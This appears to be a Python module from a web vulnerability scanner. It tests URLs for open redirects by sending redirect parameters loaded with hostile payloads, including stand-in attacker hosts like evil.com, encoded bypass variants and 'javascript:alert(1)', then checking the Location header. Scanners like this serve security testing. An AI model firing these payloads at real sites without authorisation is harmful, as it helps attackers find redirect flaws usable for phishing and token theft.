from core.http import fetch

OPEN_REDIRECT_PAYLOADS = [
    'https://example.com',
    'http://evil.com',
    'https://burpcollaborator.net',
    'http://127.0.0.1',
    '//evil.com',
    'javascript:alert(1)',
    '%2F%2Fevil.com',
    '\\/\\/evil.com',
]

def generate_tasks(url, config):
    tasks = []
    parameters = ['url', 'next', 'redirect', 'return', 'dest', 'continue', 'to', 'target']
    discovered = config.get("discovered_params", [])
    all_params = list(dict.fromkeys(parameters + discovered))
    
    for param in all_params:
        for payload in OPEN_REDIRECT_PAYLOADS:
            tasks.append({
                'url': url,
                'method': 'GET',
                'params': {param: payload},
                'type': 'Open Redirect',
                'test_param': param,
                'executor': test_open_redirect,
            })
    return tasks

async def test_open_redirect(session, task):
    try:
        text, resp = await fetch(session, task['url'], params=task['params'], allow_redirects=False)
        if resp and resp.status in [301, 302, 303, 307, 308]:
            location = resp.headers.get('Location', '')
            vulnerable = any(payload in location for payload in OPEN_REDIRECT_PAYLOADS)
            return {
                'type': 'Open Redirect',
                'url': task['url'],
                'params': task['params'],
                'vulnerable': vulnerable,
                'location': location
            }
    except Exception as exc:
        return {'error': str(exc), 'vulnerable': False}
    return {'vulnerable': False}
